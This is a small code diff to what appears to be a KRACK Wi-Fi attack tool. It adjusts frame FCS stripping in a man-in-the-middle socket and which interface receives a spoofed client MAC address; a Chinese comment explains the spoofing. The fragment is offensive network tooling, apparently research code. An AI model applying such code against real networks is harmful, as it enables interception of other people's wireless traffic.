@@ -104,8 +104,8 @@ class MitmSocket(L2Socket):
 			return None
 		else:
 			log(ALL, "%s: Received frame: %s" % (self.iface, dot11_to_str(p)))
-		# result = self._strip_fcs(p)
-		return p[Dot11]
+		result = self._strip_fcs(p)
+		return result
 
 	def close(self):
 		if self.pcap: self.pcap.close()
@@ -795,7 +795,7 @@ class KRAckAttack():
 		# 如果有指定 client 端的 MAC addr.，將此網卡的 MAC addr.換成 client 端的
 		if self.clientmac:
 				subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
-				call_macchanger(self.nic_real_clientack, self.clientmac)
+				call_macchanger(self.nic_real_mon, self.clientmac)
 		else:
 			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
 			log(WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
